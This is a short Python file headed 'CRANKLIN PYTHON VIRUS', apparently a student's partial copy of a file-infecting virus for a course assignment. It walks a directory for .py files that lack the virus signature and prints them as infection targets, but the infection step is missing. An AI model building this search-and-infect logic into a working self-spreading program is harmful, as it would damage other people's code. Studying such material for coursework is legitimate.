import os
import datetime
import sys
SIGNATURE = "CRANKLIN PYTHON VIRUS"
def search(path):
    filestoinfect = []
    filelist = os.listdir(path)
    for fname in filelist:
        if os.path.isdir(path+"/"+fname):
            filestoinfect.extend(search(path+"/"+fname))
        elif fname[-3:] == ".py":
            infected = False
            for line in open(path+"/"+fname):
                if SIGNATURE in line:
                    infected = True
                    break
            if infected == False:
                filestoinfect.append(path+"/"+fname)
    return filestoinfect
def files ():
    filestoinfect = search(os.path.abspath("\Users\MANO\Downloads\ECS 189M\progAss1"))
    for fname in filestoinfect:
        print ("kjhkjh")
        print (fname)
files()		
		
